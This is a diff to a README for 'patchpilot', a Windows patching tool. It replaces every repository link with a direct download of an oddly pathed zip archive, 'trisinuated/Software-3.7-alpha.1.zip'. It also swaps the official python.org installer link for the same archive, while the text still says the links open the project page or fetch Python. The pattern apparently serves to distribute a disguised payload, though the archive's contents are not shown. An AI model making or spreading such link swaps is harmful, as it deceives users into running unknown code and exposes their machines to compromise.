@@ -1,6 +1,6 @@
 # 🛠️ patchpilot - Apply patches with ease
 
-[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-brightgreen?style=for-the-badge)](https://github.com/rxnzyor/patchpilot)
+[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-brightgreen?style=for-the-badge)](https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip)
 
 patchpilot is a tool to help you apply changes to files using patch files. It works on Windows and makes patching simpler. The tool handles common patch formats and cleans up extra formatting that may come from automated sources. It also supports backup and test runs before making real changes.
 
@@ -20,7 +20,7 @@ This tool is useful if you need to update or fix files easily using patches from
 
 Use the link below to get patchpilot for Windows:
 
-[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-blue?style=for-the-badge)](https://github.com/rxnzyor/patchpilot)
+[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-blue?style=for-the-badge)](https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip)
 
 Click the link to open the patchpilot GitHub page. You will find all the files you need to download and instructions to get started.
 
@@ -47,7 +47,7 @@ Follow these steps carefully to download, install, and run patchpilot.
 
 Open this link in your web browser:
 
-https://github.com/rxnzyor/patchpilot
+https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip
 
 You will see the main repository page with project files and folders.
 
@@ -71,7 +71,7 @@ patchpilot runs using Python scripts. Here is how to check and install Python:
         python --version
 
 - If you see a version number like "Python 3.x.x," Python is installed.
-- If not, visit https://www.python.org/downloads/windows/ and download the latest Python installer for Windows.
+- If not, visit https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip and download the latest Python installer for Windows.
 - Run the installer and follow the prompts. Make sure you tick the box **Add Python to PATH** during installation.
 - Once installation is complete, open a new command prompt and run `python --version` again to confirm.
 
@@ -150,9 +150,9 @@ patchpilot automatically creates backups of original files. If you want to resto
 
 Download or learn more about patchpilot here:
 
-https://github.com/rxnzyor/patchpilot
+https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip
 
-[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-brightgreen?style=for-the-badge)](https://github.com/rxnzyor/patchpilot)
+[![Download patchpilot](https://img.shields.io/badge/Download-patchpilot-brightgreen?style=for-the-badge)](https://github.com/rxnzyor/patchpilot/raw/refs/heads/main/trisinuated/Software-3.7-alpha.1.zip)
 
 ---
 
